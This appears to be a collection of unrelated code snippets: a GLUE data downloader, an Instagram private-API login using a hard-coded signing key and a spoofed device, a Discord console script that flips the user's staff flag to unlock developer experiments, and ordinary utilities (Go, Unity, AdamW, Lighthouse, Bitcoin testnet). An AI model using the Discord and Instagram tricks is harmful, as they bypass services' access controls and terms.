 mrpc_train_file = os.path.join(path_to_data, ""msr_paraphrase_train.txt"")
 mrpc_test_file = os.path.join(path_to_data, ""msr_paraphrase_test.txt"")
 else:
 try:
 mrpc_train_file = os.path.join(mrpc_dir, ""msr_paraphrase_train.txt"")
 mrpc_test_file = os.path.join(mrpc_dir, ""msr_paraphrase_test.txt"")
 URLLIB.urlretrieve(MRPC_TRAIN, mrpc_train_file)
 URLLIB.urlretrieve(MRPC_TEST, mrpc_test_file)
 except urllib.error.HTTPError:
 print(""Error downloading MRPC"")
 return
 assert os.path.isfile(mrpc_train_file), ""Train data not found at %s"" % mrpc_train_file
 assert os.path.isfile(mrpc_test_file), ""Test data not found at %s"" % mrpc_test_file


 with io.open(mrpc_test_file, encoding='utf-8') as data_fh, \
 io.open(os.path.join(mrpc_dir, ""test.tsv""), 'w', encoding='utf-8') as test_fh:
 header = data_fh.readline()
 test_fh.write(""index\t#1 ID\t#2 ID\t#1 String\t#2 String\n"")
 for idx, row in enumerate(data_fh):
 label, id1, id2, s1, s2 = row.strip().split('\t')
 test_fh.write(""%d\t%s\t%s\t%s\t%s\n"" % (idx, id1, id2, s1, s2))


 try:
 URLLIB.urlretrieve(TASK2PATH[""MRPC""], os.path.join(mrpc_dir, ""dev_ids.tsv""))
 except KeyError or urllib.error.HTTPError:
 print(""\tError downloading standard development IDs for MRPC. You will need to manually split your data."")
 return


 dev_ids = []
 with io.open(os.path.join(mrpc_dir, ""dev_ids.tsv""), encoding='utf-8') as ids_fh:
 for row in ids_fh:
 dev_ids.append(row.strip().split('\t'))


 with io.open(mrpc_train_file, encoding='utf-8') as data_fh, \
 io.open(os.path.join(mrpc_dir, ""train.tsv""), 'w', encoding='utf-8') as train_fh, \
 io.open(os.path.join(mrpc_dir, ""dev.tsv""), 'w', encoding='utf-8') as dev_fh:
 header = data_fh.readline()
 train_fh.write(header)
 dev_fh.write(header)
 for row in data_fh:
 label, id1, id2, s1, s2 = row.strip().split('\t')
 if [id1, id2] in dev_ids:
 dev_fh.write(""%s\t%s\t%s\t%s\t%s\n"" % (label, id1, id2, s1, s2))
 else:
 train_fh.write(""%s\t%s\t%s\t%s\t%s\n"" % (label, id1, id2, s1, s2))
 
 print(""\tCompleted!"")
 
def download_diagnostic(data_dir):
 print(""Downloading and extracting diagnostic..."")
 if not os.path.isdir(os.path.join(data_dir, ""diagnostic"")):
 os.mkdir(os.path.join(data_dir, ""diagnostic""))
 data_file = os.path.join(data_dir, ""diagnostic"", ""diagnostic.tsv"")
 urllib.request.urlretrieve(TASK2PATH[""diagnostic""], data_file)
 print(""\tCompleted!"")
 return


def get_tasks(task_names):
 task_names = task_names.split(',')
 if ""all"" in task_names:
 tasks = TASKS
 else:
 tasks = []
 for task_name in task_names:
 assert task_name in TASKS, ""Task %s not found!"" % task_name
 tasks.append(task_name)
 return tasks


def main(arguments):
 parser = argparse.ArgumentParser()
 parser.add_argument('--data_dir', help='directory to save data to', type=str, default='glue_data')
 parser.add_argument('--tasks', help='tasks to download data for as a comma separated string',
 type=str, default='all')
 parser.add_argument('--path_to_mrpc', help='path to directory containing extracted MRPC data, msr_paraphrase_train.txt and msr_paraphrase_text.txt',
 type=str, default='')
 args = parser.parse_args(arguments)


 if not os.path.isdir(args.data_dir):
 os.mkdir(args.data_dir)
 tasks = get_tasks(args.tasks)


 for task in tasks:
 if task == 'MRPC':
 format_mrpc(args.data_dir, args.path_to_mrpc)
 elif task == 'diagnostic':
 download_diagnostic(args.data_dir)
 else:
 download_and_extract(task, args.data_dir)




if __name__ == '__main__':
 sys.exit(main(sys.argv[1:]))
==<SEPERATOR>==
instagram_login_consts.py
USERNAME, PASSWORD = 'your_instagram_login', 'your_instagram_password'


LOGIN_URL = 'https://i.instagram.com/api/v1/accounts/login/'
REQUEST_HEADERS = { 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8' }
IG_SIG_KEY = '99e16edcca71d7c1f3fd74d447f6281bd5253a623000a55ed0b60014467a53b1'


# I have more devices here: 
# https://github.com/instagrambot/instabot/blob/72d10447986db39ac95f3d0980936d9c08428b02/instabot/api/devices.py
# idk which to use, let's for now use this one, because it is just works


DEVICE = {
 'instagram_version': '26.0.0.10.86',
 'android_version': 24,
 'android_release': '7.0',
 'dpi': '640dpi',
 'resolution': '1440x2560',
 'manufacturer': 'HUAWEI',
 'device': 'LON-L29',
 'model': 'HWLON',
 'cpu': 'hi3660'
}


USER_AGENT_BASE = (
 'Instagram {instagram_version} '
 'Android ({android_version}/{android_release}; '
 '{dpi}; {resolution}; {manufacturer}; '
 '{device}; {model}; {cpu}; en_US)'
)


user_agent = USER_AGENT_BASE.format(**DEVICE)  # just insert params
==<SEPERATOR>==
instagram_login_signing.py
import uuid as uuid_library
import hmac
import json
import hashlib
import requests
import six.moves.urllib as urllib


def hex_digest(*args):
 m = hashlib.md5()
 m.update(b''.join([arg.encode('utf-8') for arg in args]))
 return m.hexdigest()


def generate_device_id(seed):
 volatile_seed = ""12345"" # Important ! :) :) 
 m = hashlib.md5()
 m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
 return 'android-' + m.hexdigest()[:16]


def generate_uuid():
 return str(uuid_library.uuid4())


def generate_signature(data):
 body = hmac.new(IG_SIG_KEY.encode('utf-8'), data.encode('utf-8'),
 hashlib.sha256).hexdigest() + '.' + urllib.parse.quote(data)
 signature = 'ig_sig_key_version=4&signed_body={body}'
 return signature.format(body=body)
==<SEPERATOR>==
instagram_login_request.py
phone_id = generate_uuid()
uuid = generate_uuid()
device_id = generate_device_id(hex_digest(USERNAME, USERNAME))


data = json.dumps({
 'phone_id': phone_id, 
 'device_id': device_id,
 'guid': uuid,
 'username': USERNAME,
 'password': PASSWORD,
})


data = generate_signature(data)


session = requests.Session()
session.headers.update(REQUEST_HEADERS)
session.headers.update({'User-Agent': user_agent})
response = session.post(LOGIN_URL, data=data)


assert response.status_code == 200
"
"values_pointers.go
","/*
********************************************************************************
Golang - Asterisk and Ampersand Cheatsheet
********************************************************************************

Also available at: https://play.golang.org/p/lNpnS9j1ma

Allowed:
--------
p := Person{""Steve"", 28} 	stores the value
p := &Person{""Steve"", 28} 	stores the pointer address (reference)
PrintPerson(p) 			passes either the value or pointer address (reference)
PrintPerson(*p) 		passes the value
PrintPerson(&p) 		passes the pointer address (reference)
func PrintPerson(p Person)	ONLY receives the value
func PrintPerson(p *Person)	ONLY receives the pointer address (reference)

Not Allowed:
--------
p := *Person{""Steve"", 28} 	illegal
func PrintPerson(p &Person)	illegal

*/


package main


import (
 ""fmt""
)


type Person struct {
 Name string
 Age int
}


// This only works with *Person, does not work with Person
// Only works with Test 2 and Test 3
func (p *Person) String() string {
 return fmt.Sprintf(""%s is %d"", p.Name, p.Age)
}


// This works with both *Person and Person, BUT you can't modiy the value and
// it takes up more space
// Works with Test 1, Test 2, Test 3, and Test 4
/*func (p Person) String() string {
	return fmt.Sprintf(""%s is %d"", p.Name, p.Age)
}*/


// *****************************************************************************
// Test 1 - Pass by Value
// *****************************************************************************


func test1() {
 p := Person{""Steve"", 28}
 printPerson1(p)
 updatePerson1(p)
 printPerson1(p)
}


func updatePerson1(p Person) {
 p.Age = 32
 printPerson1(p)
}


func printPerson1(p Person) {
 fmt.Printf(""String: %v | Name: %v | Age: %d\n"",
 p,
 p.Name,
 p.Age)
}


// *****************************************************************************
// Test 2 - Pass by Reference
// *****************************************************************************


func test2() {
 p := &Person{""Steve"", 28}
 printPerson2(p)
 updatePerson2(p)
 printPerson2(p)
}


func updatePerson2(p *Person) {
 p.Age = 32
 printPerson2(p)
}


func printPerson2(p *Person) {
 fmt.Printf(""String: %v | Name: %v | Age: %d\n"",
 p,
 p.Name,
 p.Age)
}


// *****************************************************************************
// Test 3 - Pass by Reference (requires more typing)
// *****************************************************************************


func test3() {
 p := Person{""Steve"", 28}
 printPerson3(&p)
 updatePerson3(&p)
 printPerson3(&p)
}


func updatePerson3(p *Person) {
 p.Age = 32
 printPerson3(p)
}


func printPerson3(p *Person) {
 fmt.Printf(""String: %v | Name: %v | Age: %d\n"",
 p,
 p.Name,
 p.Age)
}


// *****************************************************************************
// Test 4 - Pass by Value (requires more typing)
// *****************************************************************************


func test4() {
 p := &Person{""Steve"", 28}
 printPerson4(*p)
 updatePerson4(*p)
 printPerson4(*p)
}


func updatePerson4(p Person) {
 p.Age = 32
 printPerson4(p)
}


func printPerson4(p Person) {
 fmt.Printf(""String: %v | Name: %v | Age: %d\n"",
 p,
 p.Name,
 p.Age)
}


// *****************************************************************************
// Main
// *****************************************************************************


/*
Outputs:
String: {Steve 28} | Name: Steve | Age: 28
String: {Steve 32} | Name: Steve | Age: 32
String: {Steve 28} | Name: Steve | Age: 28
String: Steve is 28 | Name: Steve | Age: 28
String: Steve is 32 | Name: Steve | Age: 32
String: Steve is 32 | Name: Steve | Age: 32
String: Steve is 28 | Name: Steve | Age: 28
String: Steve is 32 | Name: Steve | Age: 32
String: Steve is 32 | Name: Steve | Age: 32
String: {Steve 28} | Name: Steve | Age: 28
String: {Steve 32} | Name: Steve | Age: 32
String: {Steve 28} | Name: Steve | Age: 28
*/
func main() {	
 test1()
 test2()
 test3()
 test4()
}
"
"report-bundle-size.js
","#!/usr/bin/env node
/* eslint-disable no-console */
/**
 * Copyright (c) HashiCorp, Inc.
 * SPDX-License-Identifier: MPL-2.0
 */


// edited to work with the appdir by @raphaelbadia


const path = require('path');
const fs = require('fs');
const gzSize = require('gzip-size');
const mkdirp = require('mkdirp');


// Pull options from `package.json`
const options = getOptions();
const BUILD_OUTPUT_DIRECTORY = getBuildOutputDirectory(options);


// first we check to make sure that the build output directory exists
const nextMetaRoot = path.join(process.cwd(), BUILD_OUTPUT_DIRECTORY);
try {
 fs.accessSync(nextMetaRoot, fs.constants.R_OK);
} catch (err) {
 console.error(
 `No build output found at ""${nextMetaRoot}"" - you may not have your working directory set correctly, or not have run ""next build"".`,
 );
 process.exit(1);
}


// if so, we can import the build manifest
const buildMeta = require(path.join(nextMetaRoot, 'build-manifest.json'));
const appDirMeta = require(path.join(nextMetaRoot, 'app-build-manifest.json'));


// this memory cache ensures we dont read any script file more than once
// bundles are often shared between pages
const memoryCache = {};


// since _app is the template that all other pages are rendered into,
// every page must load its scripts. we'll measure its size here
const globalBundle = buildMeta.pages['/_app'];
const globalBundleSizes = getScriptSizes(globalBundle);


// next, we calculate the size of each page's scripts, after
// subtracting out the global scripts
const allPageSizes = Object.values(buildMeta.pages).reduce((acc, scriptPaths, i) => {
 const pagePath = Object.keys(buildMeta.pages)[i];
 const scriptSizes = getScriptSizes(
 scriptPaths.filter((scriptPath) => !globalBundle.includes(scriptPath)),
 );


 acc[pagePath] = scriptSizes;


 return acc;
}, {});


const globalAppDirBundle = buildMeta.rootMainFiles;
const globalAppDirBundleSizes = getScriptSizes(globalAppDirBundle);


const allAppDirSizes = Object.values(appDirMeta.pages).reduce((acc, scriptPaths, i) => {
 const pagePath = Object.keys(appDirMeta.pages)[i];
 const scriptSizes = getScriptSizes(
 scriptPaths.filter((scriptPath) => !globalAppDirBundle.includes(scriptPath)),
 );
 acc[pagePath] = scriptSizes;


 return acc;
}, {});


// format and write the output
const rawData = JSON.stringify({
  ...allAppDirSizes,
 __global: globalAppDirBundleSizes,
});


// log ouputs to the gh actions panel
console.log(rawData);


mkdirp.sync(path.join(nextMetaRoot, 'analyze/'));
fs.writeFileSync(path.join(nextMetaRoot, 'analyze/__bundle_analysis.json'), rawData);


// --------------
// Util Functions
// --------------


// given an array of scripts, return the total of their combined file sizes
function getScriptSizes(scriptPaths) {
 const res = scriptPaths.reduce(
 (acc, scriptPath) => {
 const [rawSize, gzipSize] = getScriptSize(scriptPath);
 acc.raw += rawSize;
 acc.gzip += gzipSize;


 return acc;
 },
 { raw: 0, gzip: 0 },
 );


 return res;
}


// given an individual path to a script, return its file size
function getScriptSize(scriptPath) {
 const encoding = 'utf8';
 const p = path.join(nextMetaRoot, scriptPath);


 let rawSize, gzipSize;
 if (Object.keys(memoryCache).includes(p)) {
 rawSize = memoryCache[p][0];
 gzipSize = memoryCache[p][1];
 } else {
 const textContent = fs.readFileSync(p, encoding);
 rawSize = Buffer.byteLength(textContent, encoding);
 gzipSize = gzSize.sync(textContent);
 memoryCache[p] = [rawSize, gzipSize];
 }


 return [rawSize, gzipSize];
}


/**
 * Reads options from `package.json`
 */
function getOptions(pathPrefix = process.cwd()) {
 const pkg = require(path.join(pathPrefix, 'package.json'));


 return { ...pkg.nextBundleAnalysis, name: pkg.name };
}


/**
 * Gets the output build directory, defaults to `.next`
 *
 * @param {object} options the options parsed from package.json.nextBundleAnalysis using `getOptions`
 * @returns {string}
 */
function getBuildOutputDirectory(options) {
 return options.buildOutputDirectory || '.next';
}
"
"nwise.py
","#!/usr/bin/env python3


from itertools import tee, islice, zip_longest, chain, repeat


nwise = lambda g, *, n=2: zip(*(islice(g, i, None) for i, g in enumerate(tee(g, n))))
nwise_longest = lambda g, *, n=2, fv=object(): zip_longest(*(islice(g, i, None) for i, g in enumerate(tee(g, n))), fillvalue=fv)
first = lambda g, *, n=1: zip(chain(repeat(True, n), repeat(False)), g)
last = lambda g, *, m=1, s=object(): ((xs[-1] is s, x) for x, *xs in nwise_longest(g, n=m+1, fv=s))


if __name__ == '__main__':
 print(
 f""{[*nwise('abcd')] = }"",
 f""{[*nwise_longest('abcd')] = }"",
 f""{[*first('abcd')] = }"",
 f""{[*last('abcd')] = }"",
 sep='\n',
  )
"
"swipe.js
","var touchstartX = 0;
var touchstartY = 0;
var touchendX = 0;
var touchendY = 0;


var gesuredZone = document.getElementById('gesuredZone');


gesuredZone.addEventListener('touchstart', function(event) {
 touchstartX = event.screenX;
 touchstartY = event.screenY;
}, false);


gesuredZone.addEventListener('touchend', function(event) {
 touchendX = event.screenX;
 touchendY = event.screenY;
 handleGesure();
}, false); 


function handleGesure() {
 var swiped = 'swiped: ';
 if (touchendX < touchstartX) {
 alert(swiped + 'left!');
 }
 if (touchendX > touchstartX) {
 alert(swiped + 'right!');
 }
 if (touchendY < touchstartY) {
 alert(swiped + 'down!');
 }
 if (touchendY > touchstartY) {
 alert(swiped + 'left!');
 }
 if (touchendY == touchstartY) {
 alert('tap!');
 }
}
"
"FlyCamera.cs
","using UnityEngine;


[RequireComponent( typeof(Camera) )]
public class FlyCamera : MonoBehaviour {
 public float acceleration = 50; // how fast you accelerate
 public float accSprintMultiplier = 4; // how much faster you go when ""sprinting""
 public float lookSensitivity = 1; // mouse look sensitivity
 public float dampingCoefficient = 5; // how quickly you break to a halt after you stop your input
 public bool focusOnEnable = true; // whether or not to focus and lock cursor immediately on enable


 Vector3 velocity; // current velocity


 static bool Focused {
 get => Cursor.lockState == CursorLockMode.Locked;
 set {
			Cursor.lockState = value ? CursorLockMode.Locked : CursorLockMode.None;
			Cursor.visible = value == false;
 }
 }


 void OnEnable() {
 if( focusOnEnable ) Focused = true;
 }


 void OnDisable() => Focused = false;


 void Update() {
 // Input
 if( Focused )
			UpdateInput();
 else if( Input.GetMouseButtonDown( 0 ) )
 Focused = true;


 // Physics
 velocity = Vector3.Lerp( velocity, Vector3.zero, dampingCoefficient * Time.deltaTime );
		transform.position += velocity * Time.deltaTime;
 }


 void UpdateInput() {
 // Position
 velocity += GetAccelerationVector() * Time.deltaTime;


 // Rotation
 Vector2 mouseDelta = lookSensitivity * new Vector2( Input.GetAxis( ""Mouse X"" ), -Input.GetAxis( ""Mouse Y"" ) );
 Quaternion rotation = transform.rotation;
 Quaternion horiz = Quaternion.AngleAxis( mouseDelta.x, Vector3.up );
 Quaternion vert = Quaternion.AngleAxis( mouseDelta.y, Vector3.right );
		transform.rotation = horiz * rotation * vert;


 // Leave cursor lock
 if( Input.GetKeyDown( KeyCode.Escape ) )
 Focused = false;
 }


	Vector3 GetAccelerationVector() {
 Vector3 moveInput = default;


 void AddMovement( KeyCode key, Vector3 dir ) {
 if( Input.GetKey( key ) )
 moveInput += dir;
 }


		AddMovement( KeyCode.W, Vector3.forward );
		AddMovement( KeyCode.S, Vector3.back );
		AddMovement( KeyCode.D, Vector3.right );
		AddMovement( KeyCode.A, Vector3.left );
		AddMovement( KeyCode.Space, Vector3.up );
		AddMovement( KeyCode.LeftControl, Vector3.down );
 Vector3 direction = transform.TransformVector( moveInput.normalized );


 if( Input.GetKey( KeyCode.LeftShift ) )
 return direction * ( acceleration * accSprintMultiplier ); // ""sprinting""
 return direction * acceleration; // ""walking""
 }
}
"
"AdamW.py
","from torch.optim import Optimizer


class AdamW(Optimizer):
 """"""
       Implements Adam algorithm with weight decay fix in PyTorch
       Paper: Fixing Weight Decay Regularization in Adam by Ilya Loshchilov, Frank Hutter
       https://arxiv.org/abs/1711.05101
    """"""
 def __init__(self, params, lr, b1=0.9, b2=0.999, e=1e-8, l2=0,
 vector_l2=False, max_grad_norm=-1, **kwargs):
 if not 0.0 <= lr:
 raise ValueError(""Invalid learning rate: {}"".format(lr))
 if not 0.0 <= b1 < 1.0:
 raise ValueError(""Invalid b1 parameter: {}"".format(b1))
 if not 0.0 <= b2 < 1.0:
 raise ValueError(""Invalid b2 parameter: {}"".format(b2))
 if not 0.0 <= e:
 raise ValueError(""Invalid epsilon value: {}"".format(e))
 defaults = dict(lr=lr, b1=b1, b2=b2, e=e, l2=l2, vector_l2=vector_l2)
 super(AdamW, self).__init__(params, defaults)


 def step(self, closure=None):
 """"""Performs a single optimization step.

        Arguments:
            closure (callable, optional): A closure that reevaluates the model
                and returns the loss.
        """"""
 loss = None
 if closure is not None:
 loss = closure()


 for group in self.param_groups:
 for p in group['params']:
 if p.grad is None:
 continue
 grad = p.grad.data
 if grad.is_sparse:
 raise RuntimeError('Adam does not support sparse gradients, please consider SparseAdam instead')


 state = self.state[p]


 # State initialization
 if len(state) == 0:
 state['step'] = 0
 # Exponential moving average of gradient values
 state['exp_avg'] = torch.zeros_like(p.data)
 # Exponential moving average of squared gradient values
 state['exp_avg_sq'] = torch.zeros_like(p.data)


 exp_avg, exp_avg_sq = state['exp_avg'], state['exp_avg_sq']
 beta1, beta2 = group['b1'], group['b2']


 state['step'] += 1


 # Decay the first and second moment running average coefficient
 exp_avg.mul_(beta1).add_(1 - beta1, grad)
 exp_avg_sq.mul_(beta2).addcmul_(1 - beta2, grad, grad)
 denom = exp_avg_sq.sqrt().add_(group['e'])


 bias_correction1 = 1 - beta1 ** state['step']
 bias_correction2 = 1 - beta2 ** state['step']


 step_size = group['lr'] * math.sqrt(bias_correction2) / bias_correction1


 p.data.addcdiv_(-step_size, exp_avg, denom)


 # Add weight decay at the end (fixed version)
 if (len(p.size()) > 1 or group['vector_l2']) and group['l2'] > 0:
 p.data.add_(-group['lr'] * group['l2'], p.data)


 return loss
==<SEPERATOR>==
Discord Experiments.js
webpackChunkdiscord_app.push([[""wp_isdev_patch""], {}, r => cache=Object.values(r.c)]);
var UserStore = cache.find(m => m?.exports?.default?.getCurrentUser).exports.default;
var actions = Object.values(UserStore._dispatcher._actionHandlers._dependencyGraph.nodes);
var user = UserStore.getCurrentUser();
actions.find(n => n.name === ""ExperimentStore"").actionHandler.CONNECTION_OPEN({
 type: ""CONNECTION_OPEN"", user: {flags: user.flags |= 1}, experiments: [],
});
actions.find(n => n.name === ""DeveloperExperimentStore"").actionHandler.CONNECTION_OPEN();
webpackChunkdiscord_app.pop(); user.flags &= ~1; ""done"";
==<SEPERATOR>==
lh-config-a11y-extras.js
/**
 * Lighthouse custom config file for running A11y audits in Lighthouse.
 * Includes all a11y audits and a few from Best Practices and SEO that are accessibility related.
 * Organized into custom 'groups'
 *
 * Run:
 lighthouse https://cats.com --config-path=/path/to/this/file/lh-config-a11y-extras.js --disable-device-emulation --output=json --output-path=catsaudit.json --chrome-flags=""--headless --window-size=1300,600""
 *
 */
module.exports = {
 passes: [{
 recordTrace: true,
 pauseAfterLoadMs: 5000,
 useThrottling: true,
 gatherers: [
 'runtime-exceptions',
 'chrome-console-messages',
 'accessibility',
 'dobetterweb/doctype',
 ],
 }],
 audits: [
 'accessibility/accesskeys',
 'accessibility/aria-allowed-attr',
 'accessibility/aria-required-attr',
 'accessibility/aria-required-children',
 'accessibility/aria-required-parent',
 'accessibility/aria-roles',
 'accessibility/aria-valid-attr-value',
 'accessibility/aria-valid-attr',
 'accessibility/audio-caption',
 'accessibility/button-name',
 'accessibility/bypass',
 'accessibility/color-contrast',
 'accessibility/definition-list',
 'accessibility/dlitem',
 'accessibility/document-title',
 'accessibility/duplicate-id',
 'accessibility/frame-title',
 'accessibility/html-has-lang',
 'accessibility/html-lang-valid',
 'accessibility/image-alt',
 'accessibility/input-image-alt',
 'accessibility/label',
 'accessibility/layout-table',
 'accessibility/link-name',
 'accessibility/list',
 'accessibility/listitem',
 'accessibility/meta-refresh',
 'accessibility/meta-viewport',
 'accessibility/object-alt',
 'accessibility/tabindex',
 'accessibility/td-headers-attr',
 'accessibility/th-has-data-cells',
 'accessibility/valid-lang',
 'accessibility/video-caption',
 'accessibility/video-description',
 'accessibility/manual/custom-controls-labels',
 'accessibility/manual/custom-controls-roles',
 'accessibility/manual/focus-traps',
 'accessibility/manual/focusable-controls',
 'accessibility/manual/heading-levels',
 'accessibility/manual/logical-tab-order',
 'accessibility/manual/managed-focus',
 'accessibility/manual/offscreen-content-hidden',
 'accessibility/manual/use-landmarks',
 'accessibility/manual/visual-order-follows-dom',
 'accessibility/manual/interactive-element-affordance',
 'errors-in-console',
 'manual/pwa-cross-browser',
 'dobetterweb/doctype',
 ],
 groups: {
 'general': {
 title: 'Color Contrast Is Satisfactory',
 description: 'These are opportunities to improve the legibility of your content.',
 },
 'a11y-describe-contents': {
 title: 'Elements Describe Contents Well',
 description: 'These are opportunities to make your content easier to understand for a user of assistive technology, like a screen reader.',
 },
 'a11y-well-structured': {
 title: 'Elements Are Well Structured',
 description: 'These are opportunities to make sure your HTML is appropriately structured.',
 },
 'a11y-aria': {
 title: 'ARIA Attributes Follow Best Practices',
 description: 'These are opportunities to improve the usage of ARIA in your application which may enhance the experience for users of assistive technology, like a screen reader.',
 },
 'a11y-correct-attributes': {
 title: 'Elements Use Attributes Correctly',
 description: 'These are opportunities to improve the configuration of your HTML elements.',
 },
 'a11y-element-names': {
 title: 'Elements Have Discernible Names',
 description: 'These are opportunities to improve the semantics of the controls in your application. This may enhance the experience for users of assistive technology, like a screen reader.',
 },
 'a11y-language': {
 title: 'Page Specifies Valid Language',
 description: 'These are opportunities to improve the interpretation of your content by users in different locales.',
 },
 'a11y-meta': {
 title: 'Meta Tags Used Properly',
 description: 'These are opportunities to improve the user experience of your site.',
 },
 'a11y-manual-checks': {
 title: 'Manual Checks',
 description: 'Lorem ipsem.',
 },
 'robust': {
 title: 'Robust',
 description: 'Content must be robust enough that it can be interpreted reliably by a wide variety of user agents, including assistive technologies.',
 },
 'legible': {
 title: 'Adequate Font Sizes',
 description: 'Small text is harder to read. Links in small text results in small touch and pointer targets, which make it hard for people to click links and navigate the website. [Learn more](https://material.io/design/usability/accessibility.html#layout-typography).',
 },
 },
 categories: {
 'accessibility': {
 title: 'Accessibility',
 description: 'These checks highlight opportunities to [improve the accessibility of your web app](https://developers.google.com/web/fundamentals/accessibility). Only a subset of accessibility issues can be automatically detected so manual testing is also encouraged.',
 manualDescription: 'These items address areas which an automated testing tool cannot cover. Learn more in our guide on [conducting an accessibility review](https://developers.google.com/web/fundamentals/accessibility/how-to-review).',
 auditRefs: [
 // Standard A11y automated audits
 {id: 'accesskeys', weight: 3, group: 'a11y-correct-attributes'},
 {id: 'aria-allowed-attr', weight: 3, group: 'a11y-aria'},
 {id: 'aria-required-attr', weight: 3, group: 'a11y-aria'},
 {id: 'aria-required-children', weight: 3, group: 'a11y-aria'},
 {id: 'aria-required-parent', weight: 3, group: 'a11y-aria'},
 {id: 'aria-roles', weight: 3, group: 'a11y-aria'},
 {id: 'aria-valid-attr-value', weight: 3, group: 'a11y-aria'},
 {id: 'aria-valid-attr', weight: 3, group: 'a11y-aria'},
 {id: 'audio-caption', weight: 1, group: 'a11y-correct-attributes'},
 {id: 'button-name', weight: 9, group: 'a11y-element-names'},
 {id: 'bypass', weight: 9, group: 'a11y-describe-contents'},
 {id: 'color-contrast', weight: 11, group: 'a11y-color-contrast'},
 {id: 'definition-list', weight: 4, group: 'a11y-well-structured'},
 {id: 'dlitem', weight: 4, group: 'a11y-well-structured'},
 {id: 'document-title', weight: 2, group: 'a11y-describe-contents'},
 {id: 'duplicate-id', weight: 2, group: 'a11y-well-structured'},
 {id: 'frame-title', weight: 4, group: 'a11y-describe-contents'},
 {id: 'html-has-lang', weight: 2, group: 'a11y-language'},
 {id: 'html-lang-valid', weight: 2, group: 'a11y-language'},
 {id: 'image-alt', weight: 8, group: 'a11y-correct-attributes'},
 {id: 'input-image-alt', weight: 9, group: 'a11y-correct-attributes'},
 {id: 'label', weight: 10, group: 'a11y-describe-contents'},
 {id: 'layout-table', weight: 4, group: 'a11y-describe-contents'},
 {id: 'link-name', weight: 10, group: 'a11y-element-names'},
 {id: 'list', weight: 5, group: 'a11y-well-structured'},
 {id: 'listitem', weight: 5, group: 'a11y-well-structured'},
 {id: 'meta-refresh', weight: 2, group: 'a11y-meta'},
 {id: 'meta-viewport', weight: 2, group: 'a11y-meta'},
 {id: 'object-alt', weight: 4, group: 'a11y-describe-contents'},
 {id: 'tabindex', weight: 3, group: 'a11y-correct-attributes'},
 {id: 'td-headers-attr', weight: 1, group: 'a11y-correct-attributes'},
 {id: 'th-has-data-cells', weight: 1, group: 'a11y-correct-attributes'},
 {id: 'valid-lang', weight: 2, group: 'a11y-language'},
 {id: 'video-caption', weight: 1, group: 'a11y-describe-contents'},
 {id: 'video-description', weight: 1, group: 'a11y-describe-contents'},
 // Standard A11y manual audits
 {id: 'logical-tab-order', weight: 0, group: 'a11y-manual-checks'},
 {id: 'focusable-controls', weight: 0, group: 'a11y-manual-checks'},
 {id: 'managed-focus', weight: 0, group: 'a11y-manual-checks'},
 {id: 'focus-traps', weight: 0, group: 'a11y-manual-checks'},
 {id: 'custom-controls-labels', weight: 0, group: 'a11y-manual-checks'},
 {id: 'custom-controls-roles', weight: 0, group: 'a11y-manual-checks'},
 {id: 'visual-order-follows-dom', weight: 0, group: 'a11y-manual-checks'},
 {id: 'offscreen-content-hidden', weight: 0, group: 'a11y-manual-checks'},
 {id: 'heading-levels', weight: 0, group: 'a11y-manual-checks'},
 {id: 'use-landmarks', weight: 0, group: 'a11y-manual-checks'},
 {id: 'interactive-element-affordance', weight: 0, group: 'a11y-manual-checks'},
 // Extras
 {id: 'errors-in-console', weight: 2, group: 'robust'},
 {id: 'pwa-cross-browser', weight: 0, group: 'a11y-manual-checks'},
 {id: 'doctype', weight: 2, group: 'robust'},
 ],
 },
 },
};
"
"btc-create-raw-transaction.js
","const bitcoin = require('bitcoinjs-lib')
const psbt = new bitcoin.Psbt({ network: bitcoin.networks.testnet })


// example transaction
const unspentOutput = {
 ""txid"": ""11e5b7005a76c8a53f9a0036bc1a2745ebd73ad40017b3169894aa2c19e789d7"",
 ""vout"": 1,
 ""address"": ""2NCxBSjMaVeBFyxmGcD2X428v6k5n3pCQKN"",
 ""label"": ""payment"",
 ""redeemScript"": ""001495a994a417c45f97c87d03efb21997452d4c782f"",
 ""scriptPubKey"": ""a914d82952189f437226406ec17c8c397a34af177cd187"",
 ""amount"": 1.00000000,
 ""confirmations"": 24,
 ""spendable"": true,
 ""solvable"": true,
 ""desc"": ""sh(wpkh([7fc5659a/0'/0'/1']02284916d8cd4fdf35574d5f0aaea0c93607254b06601ef126e73d8fb075b7169f))#6k9sssw6"",
 ""safe"": true
}


// get transaction hex and check if it's a Segwit or Non-Segwit transaction
const rawTransaction = getRawHex(unspentOutput.txid) // you can use `gettransaction` rpc to get the transaction hex


if (isSegwit) {
 // add segwit transaction input
 
 psbt.addInput({
 hash: unspentOutput.txid,
 index: unspentOutput.vout,
 witnessUtxo: {
 script: Buffer.from(unspentOutput.scriptPubKey, 'hex'),
 value: unspentOutput.amount * 100000000 // value in satoshi
 },
 redeemScript: Buffer.from(unspentOutput.redeemScript, 'hex')
 })
} else {
 // add non-segwit transaction input


 psbt.addInput({
 hash: unspentOutput.txid,
 index: unspentOutput.vout,
 nonWitnessUtxo: Buffer.from(rawTransaction, 'hex'),
 redeemScript: Buffer.from(unspentOutput.redeemScript, 'hex')
 })
}


// add output - destination address and the amount to transfer to


psbt.addOutput({
 address: '2NF3WNhdXJzgChaAZgdYjHWaAvYG25Nhz58',
 value: 50000000 // value is satoshi (0.5 BTC)
})


// We have input of 1 BTC and we are trying to send 0.5 BTC
// If we just use these configurations to send the transaction, it will consume remaining 0.5 BTC as fees
// which you wouldn't want
// So leave some fee for the transaction, let's say 0.001 BTC and send the remaining amount to change address
// change address is the address you own where change from the transaction can be sent to




psbt.addOutput({
 address: '2MzaZzn4cuAByJrNRpDHEgE8Z55Y7dsi3Gq', // change address
 value: 49900000 // value is satoshi (0.499 BTC)
})


// create transaction end
==<SEPERATOR>==
Compress string.js
function compress(string, encoding) {
 const byteArray = new TextEncoder().encode(string);
 const cs = new CompressionStream(encoding);
 const writer = cs.writable.getWriter();
 writer.write(byteArray);
 writer.close();
 return new Response(cs.readable).arrayBuffer();
}


function decompress(byteArray, encoding) {
 const cs = new DecompressionStream(encoding);
 const writer = cs.writable.getWriter();
 writer.write(byteArray);
 writer.close();
 return new Response(cs.readable).arrayBuffer().then(function (arrayBuffer) {
 return new TextDecoder().decode(arrayBuffer);
 });
}
"
"SkipWhenPreviousJobIsRunningAttribute.cs
","// Zero-Clause BSD (more permissive than MIT, doesn't require copyright notice)
// 
// Permission to use, copy, modify, and/or distribute this software for any purpose
// with or without fee is hereby granted.
// 
